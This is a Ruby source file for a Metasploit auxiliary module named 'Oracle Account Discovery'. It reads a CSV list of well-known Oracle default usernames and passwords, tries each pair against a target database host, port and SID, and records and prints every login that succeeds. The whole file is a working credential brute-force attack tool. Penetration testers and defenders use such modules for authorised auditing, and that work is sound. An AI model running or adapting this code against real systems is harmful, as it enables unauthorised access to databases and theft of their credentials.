##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'csv'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Account Discovery',
      'Description'    => %q{
        This module uses a list of well known default authentication credentials
        to discover easily guessed accounts.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2009/Oct/261' ],
        ],
      'DisclosureDate' => 'Nov 20 2008'))

      register_options(
        [
          OptPath.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
        ], self.class)

      deregister_options('DBUSER','DBPASS')

  end

  def run
    return if not check_dependencies

    list = datastore['CSVFILE']

    print_status("Starting brute force on #{datastore['RHOST']}:#{datastore['RPORT']}...")

    fd = CSV.foreach(list) do |brute|

    datastore['DBUSER'] = brute[2].downcase
    datastore['DBPASS'] = brute[3].downcase

    begin
      connect
      disconnect
    rescue ::OCIError => e
      else
        if (not e)
          report_auth_info(
            :host  => "#{datastore['RHOST']}",
            :port  => "#{datastore['RPORT']}",
            :sname => 'oracle',
            :user  => "#{datastore['SID']}/#{datastore['DBUSER']}",
            :pass  => "#{datastore['DBPASS']}",
            :active => true
          )
          print_status("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
        end
    end
    end
  end
end
